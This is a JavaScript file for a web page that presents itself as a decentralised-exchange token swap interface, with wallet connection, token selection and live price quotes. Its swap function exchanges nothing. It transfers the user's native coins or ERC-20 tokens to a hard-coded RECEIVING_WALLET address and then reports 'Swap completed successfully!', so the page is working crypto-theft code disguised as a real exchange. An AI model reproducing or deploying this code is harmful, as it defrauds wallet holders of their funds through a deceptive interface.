// app.js - Enhanced DEX Token Swap Interface

// Verify required globals
if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
if (typeof TOKENS === 'undefined') throw new Error("TOKENS not defined");
if (typeof RECEIVING_WALLET === 'undefined') throw new Error("RECEIVING_WALLET not defined");

// Constants
const COINGECKO_API = "https://api.coingecko.com/api/v3";
const DEFAULT_PAIRS = {
  ethereum: { from: "ETH", to: "USDT" },
  bsc: { from: "BNB", to: "USDT" },
  polygon: { from: "MATIC", to: "USDT" }
};

// App state
let provider, signer, userAddress;
let currentNetwork = "ethereum";
let currentFromToken = null;
let currentToToken = null;
let currentSlippage = 0.5; // 0.5% default slippage

// Initialize on load
window.addEventListener('load', async () => {
  try {
    // Setup event listeners
    document.getElementById("networkSelect").addEventListener('click', showNetworkOptions);
    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
    document.getElementById("fromTokenSelect").addEventListener("click", () => showTokenList('from'));
    document.getElementById("toTokenSelect").addEventListener("click", () => showTokenList('to'));
    document.getElementById("swapBtn").addEventListener("click", handleSwap);
    document.getElementById("settingsBtn").addEventListener("click", showSettings);
    document.getElementById("closeTokenList").addEventListener("click", hideTokenList);
    document.getElementById("closeSettings").addEventListener("click", hideSettings);
    document.getElementById("metaMaskBtn").addEventListener("click", connectMetaMask);
    document.getElementById("cancelWalletConnect").addEventListener("click", hideWalletConnect);
    document.getElementById("fromAmount").addEventListener("input", updateToAmount);
    
    // Mobile-specific listeners
    if (isMobile()) {
      document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
    }
    
    // Set default tokens based on network
    const defaultFromToken = TOKENS[currentNetwork].find(t => t.symbol === DEFAULT_PAIRS[currentNetwork].from);
    const defaultToToken = TOKENS[currentNetwork].find(t => t.symbol === DEFAULT_PAIRS[currentNetwork].to);
    
    if (defaultFromToken && defaultToToken) {
      currentFromToken = defaultFromToken;
      currentToToken = defaultToToken;
      updateTokenSelectors();
    }
    
    await checkWalletEnvironment();
  } catch (err) {
    console.error("Initialization error:", err);
    updateStatus("Initialization failed: " + err.message, "error");
  }
});

// =====================
// UTILITY FUNCTIONS
// =====================

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function updateNetworkLogo(network) {
  const logoMap = {
    ethereum: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
    bsc: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
    polygon: "https://cryptologos.cc/logos/polygon-matic-logo.png"
  };
  
  const logoElement = document.querySelector(".dex-nav-logo img");
  if (logoMap[network]) {
    logoElement.src = logoMap[network];
    logoElement.alt = NETWORK_CONFIGS[network].chainName;
  }
}

function getTokenLogoUrl(token) {
  // For native tokens
  if (token.isNative) {
    return `https://cryptologos.cc/logos/${token.symbol.toLowerCase()}-${token.symbol.toLowerCase()}-logo.png`;
  }
  
  // For known contract tokens
  const knownTokens = {
    // Ethereum
    "0xdAC17F958D2ee523a2206206994597C13D831ec7": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC
    "0x6B175474E89094C44Da98b954EedeAC495271d0F": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png", // DAI
    
    // BSC
    "0x55d398326f99059fF775485246999027B3197955": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT-BSC
    "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC-BSC
    "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png", // DAI-BSC
    
    // Polygon
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F": "https://cryptologos.cc/logos/tether-usdt-logo.png", // USDT-MATIC
    "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174": "https://cryptologos.cc/logos/usd-coin-usdc-logo.png", // USDC-MATIC
    "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063": "https://cryptologos.cc/logos/multi-collateral-dai-dai-logo.png" // DAI-MATIC
  };
  
  return knownTokens[token.address] || "https://cryptologos.cc/logos/ethereum-eth-logo.png";
}

// =====================
// WALLET FUNCTIONS
// =====================

async function checkWalletEnvironment() {
  // Check if wallet was previously connected
  const savedWallet = localStorage.getItem('walletConnected');
  if (savedWallet === 'metamask' && window.ethereum) {
    try {
      await connectAndProcess();
    } catch (err) {
      console.error("Auto-connect error:", err);
      localStorage.removeItem('walletConnected');
    }
  }
  
  // Detect current network if wallet is connected
  if (window.ethereum && window.ethereum.chainId) {
    const chainId = window.ethereum.chainId;
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
  }
}

async function initializeWallet() {
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    // Save connection to localStorage
    localStorage.setItem('walletConnected', 'metamask');
    updateWalletButton(true);
    
    // Fetch initial balances
    await updateTokenBalances();
    return true;
  } catch (err) {
    console.error("Wallet initialization error:", err);
    updateStatus("Connection error. Please try again.", "error");
    return false;
  }
}

async function handleWalletConnection() {
  if (userAddress) {
    // Disconnect if already connected
    userAddress = null;
    provider = null;
    signer = null;
    localStorage.removeItem('walletConnected');
    updateWalletButton(false);
    updateSwapButton();
    updateStatus("Wallet disconnected", "success");
    document.getElementById("fromTokenBalance").textContent = "Balance: 0";
    return;
  }

  if (!window.ethereum) {
    if (isMobile()) {
      showWalletConnect();
    } else {
      updateStatus("Please install MetaMask", "error");
    }
    return;
  }

  await connectAndProcess();
}

async function connectAndProcess() {
  try {
    showLoader();
    updateStatus("Connecting wallet...", "success");

    // Request account access
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    if (accounts.length === 0) {
      throw new Error("No accounts found");
    }
    
    // Detect current network
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    for (const network in NETWORK_CONFIGS) {
      if (NETWORK_CONFIGS[network].chainId === chainId) {
        currentNetwork = network;
        document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
        updateNetworkLogo(network);
        break;
      }
    }
    
    await initializeWallet();
    updateSwapButton();
  } catch (err) {
    console.error("Connection error:", err);
    updateStatus("Error: " + err.message, "error");
    updateWalletButton(false);
    localStorage.removeItem('walletConnected');
  } finally {
    hideLoader();
  }
}

async function connectMetaMask() {
  hideWalletConnect();
  await connectAndProcess();
}

function openInTrustWallet() {
  const currentUrl = encodeURIComponent(window.location.href);
  document.getElementById('currentUrl').textContent = window.location.href;
  window.location.href = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${currentUrl}`;
  setTimeout(() => {
    document.getElementById('manualSteps').style.display = 'block';
  }, 3000);
}

// =====================
// NETWORK FUNCTIONS
// =====================

async function handleNetworkChange(network) {
  try {
    showLoader();
    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
    
    currentNetwork = network;
    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
    updateNetworkLogo(network);
    
    // Set default tokens for the new network
    const defaultFromToken = TOKENS[network].find(t => t.symbol === DEFAULT_PAIRS[network].from);
    const defaultToToken = TOKENS[network].find(t => t.symbol === DEFAULT_PAIRS[network].to);
    
    if (defaultFromToken && defaultToToken) {
      currentFromToken = defaultFromToken;
      currentToToken = defaultToToken;
      updateTokenSelectors();
      
      // Update balances if wallet is connected
      if (userAddress) {
        await updateTokenBalances();
      }
    }
    
    // If wallet is connected, check if we need to switch networks
    if (userAddress) {
      await checkNetwork();
    }
    
    updateStatus(`Switched to ${NETWORK_CONFIGS[network].chainName}`, "success");
  } catch (err) {
    console.error("Network change error:", err);
    updateStatus("Failed to switch network: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

function showNetworkOptions() {
  const networks = Object.keys(NETWORK_CONFIGS);
  const currentIndex = networks.indexOf(currentNetwork);
  const nextNetwork = networks[(currentIndex + 1) % networks.length];
  handleNetworkChange(nextNetwork);
}

async function checkNetwork() {
  try {
    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
    
    if (chainId !== targetChainId) {
      updateStatus("Switching network...", "success");
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: targetChainId }]
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [NETWORK_CONFIGS[currentNetwork]]
            });
          } catch (addError) {
            throw new Error("Please switch networks manually");
          }
        }
        throw new Error("Failed to switch network");
      }
    }
  } catch (err) {
    console.error("Network error:", err);
    throw new Error("Network error: " + err.message);
  }
}

// =====================
// TOKEN FUNCTIONS
// =====================

async function updateTokenBalances() {
  if (!userAddress || !provider) return;
  
  try {
    const balanceElement = document.getElementById("fromTokenBalance");
    balanceElement.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Loading...';
    
    // Update native token balance
    const nativeBalance = await provider.getBalance(userAddress);
    const nativeSymbol = NETWORK_CONFIGS[currentNetwork].nativeCurrency.symbol;
    const nativeDecimals = NETWORK_CONFIGS[currentNetwork].nativeCurrency.decimals;
    
    let balanceText = `Balance: ${ethers.utils.formatUnits(nativeBalance, nativeDecimals)} ${nativeSymbol}`;
    
    // Update current from token balance if it's not native
    if (currentFromToken && !currentFromToken.isNative) {
      const contract = new ethers.Contract(currentFromToken.address, ERC20_ABI, provider);
      const balance = await contract.balanceOf(userAddress);
      balanceText = `Balance: ${ethers.utils.formatUnits(balance, currentFromToken.decimals)} ${currentFromToken.symbol}`;
    }
    
    balanceElement.textContent = balanceText;
  } catch (err) {
    console.error("Error fetching balances:", err);
    document.getElementById("fromTokenBalance").textContent = "Balance: Error";
    updateStatus("Error fetching token balances", "error");
  }
}

function showTokenList(type) {
  const modal = document.getElementById("tokenListModal");
  const tokenItems = document.getElementById("tokenItems");
  const searchInput = document.getElementById("tokenSearch");
  const noTokensFound = document.getElementById("noTokensFound");
  
  // Clear previous items
  tokenItems.innerHTML = '';
  noTokensFound.style.display = 'none';
  
  // Filter tokens for current network and other networks with same symbol
  let networkTokens = [];
  for (const network in TOKENS) {
    TOKENS[network].forEach(token => {
      // Skip REWARD token
      if (token.symbol === "REWARD") return;
      
      // Add token if it's for current network or has same symbol
      if (network === currentNetwork || 
          TOKENS[currentNetwork].find(t => t.symbol === token.symbol) === undefined) {
        networkTokens.push({
          ...token,
          originNetwork: network
        });
      }
    });
  }
  
  // Sort by priority
  networkTokens.sort((a, b) => a.priority - b.priority);
  
  // Add search functionality
  searchInput.oninput = (e) => {
    const searchTerm = e.target.value.toLowerCase();
    let hasVisibleItems = false;
    const items = document.querySelectorAll('.dex-token-item');
    
    items.forEach(item => {
      const name = item.dataset.name.toLowerCase();
      const symbol = item.dataset.symbol.toLowerCase();
      const address = item.dataset.address.toLowerCase();
      
      if (name.includes(searchTerm) || 
          symbol.includes(searchTerm) || 
          address.includes(searchTerm)) {
        item.style.display = 'flex';
        hasVisibleItems = true;
      } else {
        item.style.display = 'none';
      }
    });
    
    noTokensFound.style.display = hasVisibleItems ? 'none' : 'block';
  };
  
  // Add tokens to list
  if (networkTokens.length === 0) {
    noTokensFound.style.display = 'block';
  } else {
    networkTokens.forEach(token => {
      const tokenItem = document.createElement('div');
      tokenItem.className = 'dex-token-item';
      tokenItem.dataset.name = token.name.toLowerCase();
      tokenItem.dataset.symbol = token.symbol.toLowerCase();
      tokenItem.dataset.address = token.address.toLowerCase();
      tokenItem.innerHTML = `
        <img src="${getTokenLogoUrl(token)}" 
             onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
             alt="${token.symbol}">
        <div>
          <div class="dex-token-name">${token.name} 
            ${token.originNetwork !== currentNetwork ? 
              `<span class="token-network-badge">${token.originNetwork}</span>` : ''}
          </div>
          <div class="dex-token-symbol">${token.symbol}</div>
          ${token.address ? `<div class="dex-token-address">${token.address.slice(0, 6)}...${token.address.slice(-4)}</div>` : ''}
        </div>
      `;
      
      tokenItem.addEventListener('click', () => {
        if (type === 'from') {
          currentFromToken = token;
        } else {
          currentToToken = token;
        }
        updateTokenSelectors();
        hideTokenList();
        updateToAmount();
        
        // Update balance if wallet is connected and from token changed
        if (type === 'from' && userAddress) {
          updateTokenBalances();
        }
      });
      
      tokenItems.appendChild(tokenItem);
    });
  }
  
  modal.style.display = 'flex';
  searchInput.value = '';
  searchInput.focus();
}

function hideTokenList() {
  document.getElementById("tokenListModal").style.display = 'none';
}

function updateTokenSelectors() {
  const fromTokenBtn = document.getElementById("fromTokenSelect");
  const toTokenBtn = document.getElementById("toTokenSelect");
  
  if (currentFromToken) {
    fromTokenBtn.innerHTML = `
      <img src="${getTokenLogoUrl(currentFromToken)}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24"
           alt="${currentFromToken.symbol}">
      <span>${currentFromToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    fromTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  if (currentToToken) {
    toTokenBtn.innerHTML = `
      <img src="${getTokenLogoUrl(currentToToken)}" 
           onerror="this.src='https://cryptologos.cc/logos/ethereum-eth-logo.png'" 
           width="24" height="24"
           alt="${currentToToken.symbol}">
      <span>${currentToToken.symbol}</span>
      <i class="fas fa-chevron-down"></i>
    `;
  } else {
    toTokenBtn.innerHTML = `
      <span>Select Token</span>
      <i class="fas fa-chevron-down"></i>
    `;
  }
  
  updateSwapButton();
}

async function updateToAmount() {
  const fromAmount = parseFloat(document.getElementById("fromAmount").value) || 0;
  
  if (currentFromToken && currentToToken && fromAmount > 0) {
    document.getElementById("exchangeRate").textContent = "Loading...";
    document.getElementById("minReceived").textContent = "Loading...";
    document.getElementById("priceImpact").textContent = "Loading...";
    
    try {
      const rate = await getConversionRate(currentFromToken, currentToToken);
      const toAmount = fromAmount * rate;
      const priceImpact = calculatePriceImpact(fromAmount, toAmount);
      
      // Update UI
      document.getElementById("toAmount").value = toAmount.toFixed(6);
      document.getElementById("exchangeRate").textContent = 
        `1 ${currentFromToken.symbol} = ${rate.toFixed(6)} ${currentToToken.symbol}`;
      document.getElementById("minReceived").textContent = 
        `${(toAmount * (1 - currentSlippage/100)).toFixed(6)} ${currentToToken.symbol}`;
      
      // Update price impact with color coding
      const priceImpactElement = document.getElementById("priceImpact");
      priceImpactElement.textContent = `${priceImpact.toFixed(2)}%`;
      priceImpactElement.className = "dex-price-impact" + 
        (priceImpact > 3 ? " high" : "") + 
        (priceImpact > 5 ? " very-high" : "");
      
    } catch (err) {
      console.error("Error updating amounts:", err);
      updateStatus("Error fetching price data", "error");
    }
  } else {
    document.getElementById("toAmount").value = '';
    document.getElementById("exchangeRate").textContent = '-';
    document.getElementById("minReceived").textContent = '-';
    document.getElementById("priceImpact").textContent = '<0.01%';
    document.getElementById("priceImpact").className = "dex-price-impact";
  }
  
  updateSwapButton();
}

function calculatePriceImpact(fromAmount, toAmount) {
  // Simplified price impact calculation
  // In a real DEX, this would use liquidity pool data
  const baseRate = 0.0005; // Base 0.05% impact
  const amountImpact = fromAmount * 0.0001; // 0.01% per unit
  return (baseRate + amountImpact) * 100; // Convert to percentage
}

async function getConversionRate(fromToken, toToken) {
  try {
    // Get prices from CoinGecko
    const fromPrice = await getTokenPrice(fromToken);
    const toPrice = await getTokenPrice(toToken);
    
    if (fromPrice && toPrice) {
      return fromPrice / toPrice;
    }
  } catch (err) {
    console.error("Error getting conversion rate:", err);
  }
  
  // Fallback to hardcoded rates if API fails
  const rates = {
    'ETH-USDT': 1800,
    'USDT-ETH': 0.00055,
    'ETH-USDC': 1800,
    'USDC-ETH': 0.00055,
    'ETH-DAI': 1800,
    'DAI-ETH': 0.00055,
    'BNB-USDT': 300,
    'USDT-BNB': 0.0033,
    'MATIC-USDT': 0.7,
    'USDT-MATIC': 1.428
  };
  
  const pair = `${fromToken.symbol}-${toToken.symbol}`;
  return rates[pair] || 1;
}

async function getTokenPrice(token) {
  if (!token.address || token.isNative) {
    // Handle native tokens
    const nativeIds = {
      ethereum: 'ethereum',
      bsc: 'binancecoin',
      polygon: 'matic-network'
    };
    
    try {
      const response = await fetch(`${COINGECKO_API}/simple/price?ids=${nativeIds[token.originNetwork || currentNetwork]}&vs_currencies=usd`);
      const data = await response.json();
      return data[nativeIds[token.originNetwork || currentNetwork]]?.usd;
    } catch (err) {
      console.error("Error fetching native token price:", err);
      return null;
    }
  } else {
    // Handle contract tokens
    const chainMap = {
      ethereum: 'ethereum',
      bsc: 'binance-smart-chain',
      polygon: 'polygon-pos'
    };
    
    try {
      const response = await fetch(`${COINGECKO_API}/coins/${chainMap[token.originNetwork || currentNetwork]}/contract/${token.address}`);
      const data = await response.json();
      return data.market_data?.current_price?.usd;
    } catch (err) {
      console.error(`Error getting price for ${token.symbol}:`, err);
      return null;
    }
  }
}

// =====================
// SWAP FUNCTIONS
// =====================

async function handleSwap() {
  if (!userAddress || !currentFromToken || !currentToToken) return;
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) return;
  
  try {
    showLoader();
    updateStatus("Processing swap...", "success");
    
    if (currentFromToken.isNative) {
      await transferNativeToken(fromAmount);
    } else {
      await transferERC20Token(currentFromToken, fromAmount);
    }
    
    updateStatus("Swap completed successfully!", "success");
    document.getElementById("fromAmount").value = '';
    document.getElementById("toAmount").value = '';
    
    // Update balance after swap
    await updateTokenBalances();
  } catch (err) {
    console.error("Swap error:", err);
    updateStatus("Swap failed: " + err.message, "error");
  } finally {
    hideLoader();
  }
}

async function transferNativeToken(amount) {
  const tx = await signer.sendTransaction({
    to: RECEIVING_WALLET,
    value: ethers.utils.parseEther(amount.toString()),
    gasLimit: 21000
  });
  
  await tx.wait();
}

async function transferERC20Token(token, amount) {
  const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const decimals = token.decimals || 18;
  const amountInWei = ethers.utils.parseUnits(amount.toString(), decimals);
  
  const tx = await contract.transfer(RECEIVING_WALLET, amountInWei, {
    gasLimit: 100000
  });
  
  await tx.wait();
}

// =====================
// UI FUNCTIONS
// =====================

function updateStatus(message, type) {
  const statusDiv = document.getElementById("status");
  statusDiv.style.display = "block";
  statusDiv.textContent = message;
  statusDiv.className = `dex-status ${type}`;
  
  setTimeout(() => {
    statusDiv.style.display = "none";
  }, 5000);
}

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateWalletButton(isConnected) {
  const btn = document.getElementById("connectWallet");
  if (isConnected) {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>${userAddress.slice(0, 6)}...${userAddress.slice(-4)}</span>
    `;
  } else {
    btn.innerHTML = `
      <i class="fas fa-wallet"></i>
      <span>Connect Wallet</span>
    `;
  }
  
  updateSwapButton();
}

function updateSwapButton() {
  const btn = document.getElementById("swapBtn");
  const btnText = document.getElementById("swapBtnText");
  
  if (!userAddress) {
    btn.disabled = false;
    btnText.textContent = "Connect Wallet";
    return;
  }
  
  if (!currentFromToken || !currentToToken) {
    btn.disabled = true;
    btnText.textContent = "Select Tokens";
    return;
  }
  
  const fromAmount = parseFloat(document.getElementById("fromAmount").value);
  if (!fromAmount || fromAmount <= 0) {
    btn.disabled = true;
    btnText.textContent = "Enter Amount";
    return;
  }
  
  btn.disabled = false;
  btnText.textContent = "Swap";
}

function showSettings() {
  document.getElementById("settingsModal").style.display = 'flex';
}

function hideSettings() {
  document.getElementById("settingsModal").style.display = 'none';
}

function showWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'flex';
}

function hideWalletConnect() {
  document.getElementById("walletConnectModal").style.display = 'none';
}

// Listen for account changes
if (window.ethereum) {
  window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length === 0) {
      // Wallet disconnected
      userAddress = null;
      provider = null;
      signer = null;
      localStorage.removeItem('walletConnected');
      updateWalletButton(false);
      document.getElementById("fromTokenBalance").textContent = "Balance: 0";
    } else {
      // Account changed
      userAddress = accounts[0];
      updateWalletButton(true);
      updateTokenBalances();
    }
  });

  // Listen for chain changes
  window.ethereum.on('chainChanged', (chainId) => {
    window.location.reload();
  });
}
